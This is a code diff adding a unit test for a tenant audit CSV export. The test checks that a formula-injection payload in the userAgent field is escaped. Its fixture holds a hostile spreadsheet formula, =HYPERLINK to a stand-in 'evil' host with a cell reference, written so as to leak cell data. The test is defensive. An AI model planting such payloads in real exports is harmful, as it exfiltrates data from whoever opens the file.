@@ -124,6 +124,31 @@ describe("exportTenantAuditCsv (#1292)", () => {
     expect(send).toHaveBeenCalledTimes(2);
   });
 
+  it("#1388: should neutralize a formula-injection payload from the userAgent header", async () => {
+    const send = vi.fn().mockResolvedValueOnce({
+      Items: [
+        {
+          PK: "TENANT#t-1",
+          SK: "AUDIT#A",
+          actor: "u-1",
+          action: "create_event",
+          outcome: "success",
+          // userAgent は request header 由来 (= 攻撃者制御)。 =HYPERLINK は Excel で実行される。
+          userAgent: '=HYPERLINK("http://evil/?c="&A1,"open")',
+          occurredAt: "2026-05-20T12:00:00.000Z",
+        },
+      ],
+    });
+    const csv = await exportTenantAuditCsv(
+      { ddb: { send } as never, auditTableName: "T" },
+      { tenantId: "t-1" },
+    );
+    // 先頭 = は single quote で無害化され、 quote で囲まれる (= cell として実行されない)。
+    expect(csv).toContain('"\'=HYPERLINK(""http://evil/?c=""&A1,""open"")"');
+    // 生の "=HYPERLINK( が行頭に来ない (= formula として解釈されない)。
+    expect(csv).not.toMatch(/,=HYPERLINK\(/);
+  });
+
   it("should respect maxRows truncation", async () => {
     const send = vi.fn().mockResolvedValueOnce({
       Items: Array.from({ length: 50 }, (_, i) => ({
